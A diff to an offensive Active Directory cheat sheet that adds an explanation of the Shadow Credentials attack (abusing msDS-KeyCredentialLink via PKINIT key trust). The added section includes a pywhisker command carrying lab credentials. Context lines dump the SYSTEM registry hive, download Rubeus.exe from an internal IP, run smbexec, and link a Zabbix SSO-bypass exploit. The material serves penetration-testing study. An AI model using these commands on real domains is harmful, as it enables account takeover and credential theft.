@@ -269,6 +269,51 @@ reg save hklm\system c:\temp\system.bak (System Hive keys)
 **Additional Resources**
   -  [Windows Privilege Escalation with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58)
 
+## Shadow Credentials (msDS-KeyCredentialLink | AddKeyCredentialLink)
+
+### Understanding PKINIT (Public Key Cryptography for Initial Authentication)
+*Credits to SpecterOps [link here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)*
+
+In Kerberos authentication, clients must perform "pre-authentication" before the KDC provides them with a Ticket Granting Ticket (TGT), which can subsequently be used to obtain Service Tickets. The reason for pre-authentication is that without it, anyone could obtain a blob encrypted with a key derived from the client’s password and try to crack it offline, as done in the AS-REP Roasting Attack.
+
+The client performs pre-authentication by encrypting a timestamp with their credentials to prove to the KDC that they have the credentials for the account. This is usually done via a symmetric key approach, derived from the client’s password, AKA secret key. If using RC4 encryption, this key would be the NT hash of the client’s password. The KDC has a copy of the client’s secret key and can decrypt the pre-authentication data to authenticate the client. The KDC uses the same key to encrypt a session key sent to the client along with the TGT.
+
+PKINIT is the less common, asymmetric key (public key) approach. The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. This requires an exchange of certificates using a Certificate Authority which they both trust, through a method known as the Certificate Trust model.
+
+A new concept introduced in Windows Server 2016 allowed for Key Trusts that support passwordless authentication. The client’s public key is stored in a multi-value attribute called `msDS-KeyCredentialLink`. The values of this attribute are Key Credentials, which are serialized objects containing information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and, of course, the public key.
+
+![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/02de8c83-70fc-4ae3-a294-fcee6b2d22e6)
+
+### Windows Hello Enrollment
+
+When a user enrolls, the TPM (Trusted Platform Module) generates a public-private key pair for the user’s account — the private key should never leave the TPM. Next, if the Certificate Trust model is implemented in the organization, the client issues a certificate request to obtain a trusted certificate from the environment’s certificate issuing authority for the TPM-generated key pair. 
+
+![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/69e08f9d-f2ba-45f8-84e8-805d6b85052d)
+
+However, if the Key Trust model is implemented, the public key is stored in a new Key Credential object in the msDS-KeyCredentialLink attribute of the account. The private key is protected by a PIN code, which Windows Hello allows replacing with a biometric authentication factor, such as fingerprint or face recognition.
+
+### msDS-KeyCredentialLink
+In essence, the `msDS-KeyCredentialLink` attribute is part of the implementation for Windows Hello for Business and other key-based authentication mechanisms in Active Directory (AD). It is used to store public key credentials for an Active Directory object, typically a user or a device. This attribute enables passwordless authentication methods, such as biometrics (e.g., fingerprint or facial recognition) and PINs, by linking them to the user or device's AD account.
+
+This means that if you can write to the msDS-KeyCredentialLink property of a user, you can obtain a TGT for that user. If there is a relationship between Domain Users or Computer accounts that allow `AddKeyCredentialLink`, it may be possible to takeover that user or object. It is also possible to obtain the NTLM hash of the user
+
+### Shadow Credentials
+When abusing Key Trust, we are effectively adding alternative credentials to the account, or “Shadow Credentials”, allowing for obtaining a TGT and subsequently the NTLM hash for the user/computer. Those Shadow Credentials would persist even if the user/computer changed their password.
+
+### Exploitation
+Use [pywhisker for Linux](https://github.com/ShutdownRepo/pywhisker) or [Whisker for Windows](https://github.com/eladshamir/Whisker) to abuse.
+
+Can use `add` to generate a new public|private key pair and add it to the `msDS-KeyCredentialLink` property. Also keep in mind that it might be useful to use the `remove` for cleanup.
+
+```
+python3 pywhisker.py -d "zsm.local" -u "marcus" -p "\!QAZ2wsx" -t "ZPH-SVRMGMT1$" --action "add" -v 
+```
+
+**Additional Resources**
+  - [Shadow Credentials - Computer Account Take Over](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials#computer-account-take-over)
+  - [SpectreOps - Shadow Credentials Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+  - [The Hacker Recipes - ACE Abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
+  - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)
 
 -----------------------------------------------------------------------
 
@@ -393,7 +438,8 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
 **[Exploitation of Monitoring Systems](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet)**
 
   - [Zabbix Agent](https://medium.com/@ferspider3/enabling-zabbix-agent-windows-to-accept-remote-commands-2597c40259b6)
-    - Scripts in Zabbix can be used to perform custom monitoring checks, collect and process data from external sources, and automate tasks based on monitoring events. 
+    - Scripts in Zabbix can be used to perform custom monitoring checks, collect and process data from external sources, and automate tasks based on monitoring events.
+  - [Zabbix SSO bypass](https://github.com/Mr-xn/cve-2022-23131)
 
 -----------------------------------------------------------------------
 
@@ -446,5 +492,6 @@ smbexec.py administrator@dc.painters.htb -k -no-pass -debug
 
 ## Resources
  - [The Hacker Recipes](https://www.thehacker.recipes/)
+ - [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
  - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
  - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/)
